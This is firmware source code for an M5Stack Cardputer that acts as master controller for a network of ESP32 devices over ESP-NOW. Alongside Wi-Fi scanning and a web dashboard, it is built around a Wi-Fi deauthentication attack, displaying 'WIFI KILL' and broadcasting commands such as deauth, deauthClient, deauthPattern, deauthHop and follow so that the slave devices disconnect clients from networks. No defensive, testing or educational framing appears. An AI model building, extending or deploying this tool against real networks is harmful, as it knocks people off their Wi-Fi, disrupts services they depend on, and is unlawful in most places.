/*
 * Project Orchestrator - Master Firmware
 * 
 * Target: M5Stack Cardputer (ESP32-S3)
 * 
 * Description:
 * This firmware turns the M5 Cardputer into a master controller for a network
 * of ESP32 slaves. It uses the ESP-NOW protocol for fast, connectionless
 * communication.
 * 
 * Features:
 * - Initializes Cardputer hardware (Display, Keyboard) using M5Unified.
 * - Establishes an ESP-NOW network and listens for pairing requests.
 * - Automatically pairs with any slave that broadcasts a pairing request.
 * - Manages a list of connected slaves.
 * - Provides a simple command-line interface on the TFT display.
 * - Implements the 'scan' command to initiate a distributed Wi-Fi scan.
 * - Aggregates and displays results from slaves.
 * 
 */

// Core M5Stack library for unified hardware access
#include <M5Unified.h>

// Libraries for ESP-NOW and Wi-Fi functionality
#include <esp_now.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <map>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <ArduinoJson.h>

// Forward declarations
void drawUI();

const int MAX_SLAVES = 16;

// Display deauthentication logo on screen
void displayDeauthLogo() {
    M5.Display.setTextColor(RED);
    M5.Display.setTextSize(3);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("WIFI KILL", M5.Display.width() / 2, M5.Display.height() / 2);
}

// Web server configuration
WebServer server(80);
const char* hostname = "orchestrator";

// =================================================================
// == DATA STRUCTURES & DEFINITIONS
// =================================================================

// Define a structure for each slave device in our network
struct ClientDevice {
    uint8_t mac[6];
    String ssid;
    int rssi;
    uint8_t channel;
};

struct SlaveDevice {
    uint8_t mac_addr[6];
    std::vector<ClientDevice> clients;
    unsigned long last_seen;
    uint8_t channel;
};

// Define the structure of data packets for communication.
// Using structs ensures both master and slave interpret data identically.
enum MessageType : uint8_t {
    PAIRING_REQUEST,
    PAIRING_RESPONSE,
    COMMAND_PACKET,
    SCAN_RESULT_PACKET,
    DEAUTH_GROUP_PACKET,
    STATS_PACKET,
    RSSI_PACKET
};

struct __attribute__((packed)) DataPacketHeader {
    MessageType type;
};

struct __attribute__((packed)) CommandPacket {
    DataPacketHeader header;
    char command[32];
    char args[64];
};

struct __attribute__((packed)) ScanResultPacket {
    DataPacketHeader header;
    char ssid[32]; // SSID can be up to 32 chars + null terminator
    int32_t rssi;
    uint8_t channel;
    uint8_t mac_reporter[6]; // MAC of the slave that found this network
};

struct __attribute__((packed)) StatsPacket {
    DataPacketHeader header;
    uint8_t channel;
    uint32_t count;
};

struct __attribute__((packed)) RSSIPacket {
    DataPacketHeader header;
    uint8_t mac[6];  // MAC of the client being reported
    int8_t rssi;     // RSSI value
};


// =================================================================
// == GLOBAL VARIABLES
// =================================================================

// A vector to dynamically store information about connected slaves
std::vector<SlaveDevice> slaves;

// UI-related variables
String command_buffer = "";
const int MAX_LOG_LINES = 10;
String log_lines[MAX_LOG_LINES];
int current_log_line = 0;
bool show_menu = false;
bool deauth_active = false; // Track deauth state globally
const char* menu_items[] = {"scan", "ping", "deauth", "reboot", "help", "clear"};
int menu_selection = 0;
static const uint8_t broadcast_addr[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// =================================================================
// == UTILITY & UI FUNCTIONS
// =================================================================

// Helper function to convert a MAC address to a String for display
String macToString(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// Add a message to the scrolling log on the display
void addLog(String message) {
    log_lines[current_log_line] = message;
    current_log_line = (current_log_line + 1) % MAX_LOG_LINES;
    drawUI();
}

// Draw slave status panel
void drawSlavePanel() {
    int panel_width = M5.Display.width() / 3;
    M5.Display.fillRect(0, 16, panel_width, M5.Display.height() - 36, NAVY);
    
    M5.Display.setTextColor(WHITE, NAVY);
    M5.Display.setTextSize(1);
    M5.Display.setTextDatum(TL_DATUM);
    
    M5.Display.drawString("CONNECTED SLAVES", 5, 20);
    M5.Display.drawFastHLine(0, 35, panel_width, WHITE);

    String max_slaves_msg = "Max Slaves: " + String(MAX_SLAVES);
    M5.Display.drawString(max_slaves_msg, 5, M5.Display.height() - 30);
    
    if (slaves.size() > MAX_SLAVES) {
        M5.Display.setTextColor(RED, NAVY);
        M5.Display.drawString("Warning: Exceeding recommended slave count!", 5, M5.Display.height() - 15);
    } else {
        M5.Display.setTextColor(WHITE, NAVY);
    }
    
    for (size_t i = 0; i < slaves.size(); i++) {
        int y_pos = 40 + i * 15;
        if (y_pos > M5.Display.height() - 40) break;
        
        String slave_info = macToString(slaves[i].mac_addr) + " (" + String(slaves[i].clients.size()) + " clients)";
        M5.Display.drawString(slave_info, 5, y_pos);
    }
}

// Global variables for stats and RSSI data
std::map<String, std::map<uint8_t, uint32_t>> statsMatrix; // slave_mac -> channel -> count
std::map<String, std::map<String, int8_t>> rssiMatrix; // slave_mac -> client_mac -> rssi

// Update statistics matrix with new data
void updateStatsMatrix(const uint8_t* slave_mac, uint8_t channel, uint32_t count) {
    String mac_str = macToString(slave_mac);
    statsMatrix[mac_str][channel] = count;
}

// Draw statistics graph
void drawStatsGraph() {
    M5.Display.fillRect(M5.Display.width()/3, 16, M5.Display.width()/3, M5.Display.height()-36, BLACK);
    
    if (statsMatrix.empty()) return;
    
    // Find max count for scaling
    uint32_t max_count = 0;
    for (const auto& [mac, channels] : statsMatrix) {
        for (const auto& [channel, count] : channels) {
            if (count > max_count) max_count = count;
        }
    }
    
    if (max_count == 0) return;
    
    // Draw bars for each channel
    int bar_width = 10;
    int spacing = 5;
    int start_x = M5.Display.width()/3 + 20;
    int base_y = M5.Display.height() - 40;
    int max_height = M5.Display.height() - 80;
    
    for (const auto& [mac, channels] : statsMatrix) {
        for (const auto& [channel, count] : channels) {
            int bar_height = (count * max_height) / max_count;
            int x = start_x + (channel * (bar_width + spacing));
            M5.Display.fillRect(x, base_y - bar_height, bar_width, bar_height, BLUE);
            M5.Display.setTextSize(1);
            M5.Display.drawString(String(channel), x, base_y + 5);
        }
    }
}

// Update RSSI matrix with new data
void updateRssiMatrix(const uint8_t* slave_mac, const uint8_t* client_mac, int8_t rssi) {
    String slave_str = macToString(slave_mac);
    String client_str = macToString(client_mac);
    rssiMatrix[slave_str][client_str] = rssi;
}

// Draw RSSI heatmap
void drawRssiHeatmap() {
    M5.Display.fillRect(M5.Display.width()/3, 16, M5.Display.width()/3, M5.Display.height()-36, BLACK);
    
    if (rssiMatrix.empty()) return;
    
    // Draw heatmap grid
    int cell_size = 20;
    int start_x = M5.Display.width()/3 + 20;
    int start_y = 40;
    
    // Find min/max RSSI for color scaling
    int8_t min_rssi = 0;
    int8_t max_rssi = -100;
    for (const auto& [slave, clients] : rssiMatrix) {
        for (const auto& [client, rssi] : clients) {
            if (rssi < min_rssi) min_rssi = rssi;
            if (rssi > max_rssi) max_rssi = rssi;
        }
    }
    
    // Draw cells
    int row = 0;
    for (const auto& [slave, clients] : rssiMatrix) {
        int col = 0;
        for (const auto& [client, rssi] : clients) {
            // Map RSSI to color (red = weak, green = strong)
            uint8_t green = map(rssi, min_rssi, max_rssi, 0, 255);
            uint8_t red = 255 - green;
            uint16_t color = M5.Display.color565(red, green, 0);
            
            int x = start_x + (col * cell_size);
            int y = start_y + (row * cell_size);
            M5.Display.fillRect(x, y, cell_size-2, cell_size-2, color);
            col++;
        }
        row++;
    }
}

// Draw command menu
void drawMenu() {
    int menu_width = M5.Display.width() / 3;
    int menu_x = M5.Display.width() - menu_width;
    M5.Display.fillRect(menu_x, 16, menu_width, M5.Display.height() - 36, PURPLE);
    
    M5.Display.setTextColor(WHITE, PURPLE);
    M5.Display.setTextSize(1);
    M5.Display.setTextDatum(TL_DATUM);
    
    M5.Display.drawString("COMMAND MENU", menu_x + 5, 20);
    M5.Display.drawFastHLine(menu_x, 35, menu_width, WHITE);
    
    constexpr int MENU_COUNT = sizeof(menu_items) / sizeof(*menu_items);
    for (int i = 0; i < MENU_COUNT; i++) {
        int y_pos = 40 + i * 15;
        uint16_t bg = (i == menu_selection) ? MAROON : PURPLE;
        M5.Display.fillRect(menu_x, y_pos - 2, menu_width, 14, bg);
        M5.Display.drawString(menu_items[i], menu_x + 5, y_pos);
    }
}

// Redraw the entire UI
void drawUI() {
    // Clear the display (including the logo)
    if (!deauth_active) {
        M5.Display.fillScreen(BLACK);
    }
    
    // Header
    M5.Display.fillRect(0, 0, M5.Display.width(), 16, DARKGREY);
    M5.Display.setTextColor(WHITE, DARKGREY);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("Orchestrator v1.0", M5.Display.width() / 2, 8);
    
    // Draw panels
    drawSlavePanel();
    if (show_menu) drawMenu();
    
    // Main log area
    int log_x = (M5.Display.width() / 3) + 5;
    int log_width = show_menu ? (M5.Display.width() / 3) - 10 : (2 * M5.Display.width() / 3) - 10;
    
    M5.Display.setTextColor(WHITE);
    M5.Display.setTextSize(1);
    M5.Display.setTextDatum(TL_DATUM);
    
    for (int i = 0; i < MAX_LOG_LINES; i++) {
        int line_index = (current_log_line + i) % MAX_LOG_LINES;
        if (log_lines[line_index].length() > 0) {
            M5.Display.drawString(log_lines[line_index], log_x, 20 + i * 12);
        }
    }
    
    // Command input area
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, DARKGREY);
    M5.Display.setTextColor(GREEN, DARKGREY);
    M5.Display.drawString("> " + command_buffer, 5, M5.Display.height() - 15);
    
    // Menu toggle hint
    if (!show_menu) {
        M5.Display.setTextColor(YELLOW, DARKGREY);
        M5.Display.drawString("MENU:F1", M5.Display.width() - 50, M5.Display.height() - 15);
    }
}

// Check if a slave with a given MAC address is already known
bool isSlaveKnown(const uint8_t* mac) {
    for (const auto& slave : slaves) {
        if (memcmp(slave.mac_addr, mac, 6) == 0) {
            return true;
        }
    }
    return false;
}

// =================================================================
// == ESP-NOW CALLBACK FUNCTIONS
// =================================================================

// Callback function executed when data is sent
void OnDataSent(const uint8_t *mac_addr, esp_now_send_status_t status) {
    // For now, we don't need to do much here. Could add logging for failed sends.
    // Serial.print("Last Packet Send Status: ");
    // Serial.println(status == ESP_NOW_SEND_SUCCESS? "Delivery Success" : "Delivery Fail");
}

// Callback function executed when data is received
void OnDataRecv(const uint8_t *mac, const uint8_t *incomingData, int len) {
    DataPacketHeader* header = (DataPacketHeader*)incomingData;

    switch (header->type) {
        case PAIRING_REQUEST: {
            if (!isSlaveKnown(mac)) {
                // A new slave wants to pair. Add it.
                SlaveDevice new_slave;
                memcpy(new_slave.mac_addr, mac, 6);
                slaves.push_back(new_slave);

                // Add peer to ESP-NOW
                esp_now_peer_info_t peerInfo = {};
                memcpy(peerInfo.peer_addr, mac, 6);
                peerInfo.ifidx = WIFI_IF_STA;
                peerInfo.channel = 1; // Use fixed channel 1
                peerInfo.encrypt = false;
                if (esp_now_add_peer(&peerInfo)!= ESP_OK) {
                    addLog("Failed to add peer");
                    // Remove from our list if ESP-NOW fails
                    slaves.pop_back(); 
                    return;
                }
                
                // Send a response to confirm pairing
                DataPacketHeader responseHeader;
                responseHeader.type = PAIRING_RESPONSE;
                esp_now_send(mac, (uint8_t*)&responseHeader, sizeof(responseHeader));

                addLog("Paired: " + macToString(mac));
                drawUI(); // Update UI with new slave count
            }
            break;
        }

        case SCAN_RESULT_PACKET: {
            ScanResultPacket* result = (ScanResultPacket*)incomingData;
            uint8_t reporter_mac[6];
            memcpy(reporter_mac, &result->mac_reporter, 6);
            String log_msg = macToString(reporter_mac) + " found " +
                             String(result->ssid) + " (" + String(result->rssi) + "dBm)";
            addLog(log_msg);

            // Find the slave in the slaves vector
            for (auto& slave : slaves) {
                if (memcmp(slave.mac_addr, reporter_mac, 6) == 0) {
                    // Create a new ClientDevice
                    ClientDevice client;
                    memcpy(client.mac, result->mac_reporter, 6);
                    client.ssid = String(result->ssid);
                    client.rssi = result->rssi;
                    client.channel = result->channel;

                    // Add the client to the slave's client list
                    slave.clients.push_back(client);
                    slave.last_seen = millis();
                    break;
                }
            }
            drawUI(); // Update UI with new scan result
            break;
        }

        case STATS_PACKET: {
            StatsPacket* s = (StatsPacket*)incomingData;
            // store s->count by s->channel for that slave
            updateStatsMatrix(mac, s->channel, s->count);
            drawStatsGraph();
            break;
        }
        case RSSI_PACKET: {
            RSSIPacket* r = (RSSIPacket*)incomingData;
            // store r->rssi under r->mac for this slave
            updateRssiMatrix(mac, r->mac, r->rssi);
            drawRssiHeatmap();
            break;
        }
        default:
            // Unknown packet type
            addLog("Unknown packet from " + macToString(mac));
            drawUI();
            break;
    }
}

// =================================================================
// == SETUP
// =================================================================

// Web interface handlers
void handleRoot() {
    DynamicJsonDocument doc(2048);
    doc["status"] = "online";
    doc["slave_count"] = slaves.size();
    
    JsonArray slaveArray = doc.createNestedArray("slaves");
    for (const auto& slave : slaves) {
        JsonObject slaveObj = slaveArray.createNestedObject();
        slaveObj["mac"] = macToString(slave.mac_addr);
        slaveObj["last_seen"] = slave.last_seen;
        slaveObj["client_count"] = slave.clients.size();
        
        JsonArray clientsArray = slaveObj.createNestedArray("clients");
        for (const auto& client : slave.clients) {
            JsonObject clientObj = clientsArray.createNestedObject();
            clientObj["mac"] = macToString(client.mac);
            clientObj["ssid"] = client.ssid;
            clientObj["rssi"] = client.rssi;
            clientObj["channel"] = client.channel;
        }
    }

    String output;
    serializeJson(doc, output);
    server.send(200, "application/json", output);
}

void handleVisualization() {
    String html = R"=====(
    <!DOCTYPE html>
    <html>
    <head>
        <title>Orchestrator Visualization</title>
        <script src="https://d3js.org/d3.v7.min.js"></script>
        <style>
            .node { stroke: #fff; stroke-width: 1.5px; }
            .link { stroke: #999; stroke-opacity: .6; }
            .client { fill: #ff7f0e; }
            .slave { fill: #1f77b4; }
        </style>
    </head>
    <body>
        <div id="network"></div>
        <script>
            function updateVisualization() {
                fetch('/').then(r => r.json()).then(data => {
                    const width = 800;
                    const height = 600;
                    
                    // Clear previous visualization
                    d3.select("#network").html("");
                    
                    // Create SVG canvas
                    const svg = d3.select("#network")
                        .append("svg")
                        .attr("width", width)
                        .attr("height", height);
                    
                    // Create force simulation
                    const simulation = d3.forceSimulation()
                        .force("link", d3.forceLink().id(d => d.id))
                        .force("charge", d3.forceManyBody().strength(-300))
                        .force("center", d3.forceCenter(width / 2, height / 2));
                    
                    // Process data for visualization
                    const nodes = [];
                    const links = [];
                    
                    // Add master node
                    nodes.push({
                        id: "master",
                        type: "master",
                        size: 20
                    });
                    
                    // Add slaves and clients
                    data.slaves.forEach(slave => {
                        nodes.push({
                            id: slave.mac,
                            type: "slave",
                            size: 15,
                            client_count: slave.client_count
                        });
                        
                        // Link slave to master
                        links.push({
                            source: "master",
                            target: slave.mac
                        });
                        
                        // Add clients
                        slave.clients.forEach(client => {
                            nodes.push({
                                id: client.mac,
                                type: "client",
                                size: 10,
                                ssid: client.ssid,
                                rssi: client.rssi,
                                channel: client.channel
                            });
                            
                            // Link client to slave
                            links.push({
                                source: slave.mac,
                                target: client.mac
                            });
                        });
                    });
                    
                    // Draw links
                    const link = svg.append("g")
                        .selectAll("line")
                        .data(links)
                        .enter().append("line")
                        .attr("class", "link");
                    
                    // Draw nodes
                    const node = svg.append("g")
                        .selectAll("circle")
                        .data(nodes)
                        .enter().append("circle")
                        .attr("class", d => `node ${d.type}`)
                        .attr("r", d => d.size)
                        .call(d3.drag()
                            .on("start", dragstarted)
                            .on("drag", dragged)
                            .on("end", dragended));
                    
                    // Add tooltips
                    node.append("title")
                        .text(d => `${d.type}: ${d.id}\n${d.client_count ? `Clients: ${d.client_count}\n` : ''}${d.ssid ? `SSID: ${d.ssid}\nRSSI: ${d.rssi}dBm\nChannel: ${d.channel}` : ''}`);
                    
                    // Update simulation
                    simulation
                        .nodes(nodes)
                        .on("tick", ticked);
                    
                    simulation.force("link")
                        .links(links);
                    
                    function ticked() {
                        link
                            .attr("x1", d => d.source.x)
                            .attr("y1", d => d.source.y)
                            .attr("x2", d => d.target.x)
                            .attr("y2", d => d.target.y);
                        
                        node
                            .attr("cx", d => d.x)
                            .attr("cy", d => d.y);
                    }
                    
                    function dragstarted(event, d) {
                        if (!event.active) simulation.alphaTarget(0.3).restart();
                        d.fx = d.x;
                        d.fy = d.y;
                    }
                    
                    function dragged(event, d) {
                        d.fx = event.x;
                        d.fy = event.y;
                    }
                    
                    function dragended(event, d) {
                        if (!event.active) simulation.alphaTarget(0);
                        d.fx = null;
                        d.fy = null;
                    }
                });
            }
            setInterval(updateVisualization, 2000);
        </script>
    </body>
    </html>
    )=====";
    server.send(200, "text/html", html);
}

void setup() {
    // Initialize M5Stack hardware. The 'true' argument enables all peripherals.
    auto cfg = M5.config();
    M5.begin(cfg);

    // The Cardputer screen is landscape, but oriented strangely.
    // Rotation 1 is the correct orientation for holding it.
    M5.Display.setRotation(1);
    M5.Display.setTextSize(2);
    M5.Display.fillScreen(BLACK);

    // Initialize Serial early for debugging
    Serial.begin(115200);
    Serial.print("Master MAC Address: ");
    Serial.println(WiFi.macAddress());

    // Initialize Wi-Fi in Station mode for ESP-NOW and set fixed channel
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // choose a channel both will use
    Serial.print("Master MAC Address: ");
    Serial.println(WiFi.macAddress());

    // Initialize ESP-NOW
    if (esp_now_init()!= ESP_OK) {
        M5.Display.println("Error initializing ESP-NOW");
        return;
    }

    // Register the callback functions
    esp_now_register_send_cb(OnDataSent);
    esp_now_register_recv_cb(OnDataRecv);

    // Initial UI draw
    addLog("Orchestrator Online.");
    addLog("Awaiting slaves...");
    drawUI();
}


// =================================================================
// == MAIN LOOP
// =================================================================

void loop() {
    // M5.update() is crucial. It polls the keyboard and other hardware.
    M5.update();

    // Check for button input
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnC.wasPressed()) {
        // Simple button input handling
        if (M5.BtnA.wasPressed()) command_buffer += "scan";
        if (M5.BtnB.wasPressed()) command_buffer += "deauth";
        if (M5.BtnC.wasPressed() && command_buffer.length() > 0) {
            command_buffer.remove(command_buffer.length() - 1);
        }
    }
    
    // Check for serial input as fallback
    if (Serial.available()) {
        command_buffer = Serial.readStringUntil('\n');
        command_buffer.trim();
    }

    // Handle command execution when Enter is pressed (BtnC)
    if (M5.BtnC.wasPressed() && command_buffer.length() > 0) {
        addLog("> " + command_buffer);
        
        // --- COMMAND PARSING ---
        if (command_buffer.startsWith("deauth")) {
            // Display the deauth logo
            displayDeauthLogo();
            deauth_active = true;

            // Send deauth command to all slaves
            CommandPacket cmd;
            cmd.header.type = COMMAND_PACKET;
            strncpy(cmd.command, "deauth", sizeof(cmd.command)-1);
            cmd.command[sizeof(cmd.command)-1] = '\0';
            
            // Check if targeting specific network
            if (command_buffer.length() > 7) {
                String target = command_buffer.substring(7);
                strncpy(cmd.args, target.c_str(), sizeof(cmd.args)-1);
                cmd.args[sizeof(cmd.args)-1] = '\0';
            } else {
                strncpy(cmd.args, "all", sizeof(cmd.args)-1);
                cmd.args[sizeof(cmd.args)-1] = '\0';
            }
            
            esp_now_send(broadcast_addr, (uint8_t*)&cmd, sizeof(cmd));
            addLog("Deauth command sent - will target both 2.4GHz and 5GHz networks");
        }
        else if (command_buffer == "scan") {
            // Broadcast the scan command to all paired slaves
            CommandPacket cmd;
            cmd.header.type = COMMAND_PACKET;
            strncpy(cmd.command, "scan", sizeof(cmd.command)-1);
            cmd.command[sizeof(cmd.command)-1] = '\0';
            strncpy(cmd.args, "", sizeof(cmd.args)-1);
            cmd.args[sizeof(cmd.args)-1] = '\0';
            
            esp_now_send(broadcast_addr, (uint8_t*)&cmd, sizeof(cmd)); 
            addLog("Broadcast: SCAN");
        }
        else if (command_buffer == "clear") {
            for(int i=0; i<MAX_LOG_LINES; i++) log_lines[i] = "";
            addLog("Logs cleared.");
        }
        else if (command_buffer == "help") {
            addLog("Cmds: scan, ping, deauth, clear, help");
        }
        else if (command_buffer.startsWith("deauthA")||command_buffer.startsWith("deauthB")) {
            // Group-toggle
            CommandPacket p = {};
            p.header.type = DEAUTH_GROUP_PACKET;
            strncpy(p.args, command_buffer.c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("follow ")) {
            // Follow-the-client
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"follow");
            strncpy(p.args, command_buffer.substring(7).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("deauthClient ")) {
            // Target-client only
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"deauthClient");
            strncpy(p.args, command_buffer.substring(13).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("deauthPattern ")) {
            // SSID pattern
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"deauthPattern");
            strncpy(p.args, command_buffer.substring(14).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("deauthHop ")) {
            // Channel-hop interval
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"deauthHop");
            strncpy(p.args, command_buffer.substring(10).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("deauthRate ")) {
            // Rate limit
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"deauthRate");
            strncpy(p.args, command_buffer.substring(11).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("deauthProb ")) {
            // Probabilistic
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"deauthProb");
            strncpy(p.args, command_buffer.substring(10).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("deauthWindow ")) {
            // Scheduled window
            CommandPacket p = {};
            p.header.type = COMMAND_PACKET;
            strcpy(p.command,"deauthWindow");
            strncpy(p.args, command_buffer.substring(12).c_str(), sizeof(p.args)-1);
            esp_now_send(broadcast_addr,(uint8_t*)&p,sizeof(p));
        }
        else if (command_buffer.startsWith("ping")) {
            // Send ping command to specified slave or all
            CommandPacket cmd;
            cmd.header.type = COMMAND_PACKET;
            strncpy(cmd.command, "ping", sizeof(cmd.command)-1);
            cmd.command[sizeof(cmd.command)-1] = '\0';
            strncpy(cmd.args, "", sizeof(cmd.args)-1);
            cmd.args[sizeof(cmd.args)-1] = '\0';
            
            if (command_buffer == "ping") {
                // Broadcast to all
                esp_now_send(broadcast_addr, (uint8_t*)&cmd, sizeof(cmd));
                addLog("Ping broadcast to all slaves");
            } else {
                // TODO: Implement targeted ping
                addLog("Targeted ping not yet implemented");
            }
        }
        else {
            addLog("Unknown command");
        }
        deauth_active = command_buffer.startsWith("deauth");
        command_buffer = ""; // Clear buffer after execution
    }

    // Handle web server clients
    server.handleClient();

    // Redraw the UI to show the updated command buffer or log
    drawUI();
}
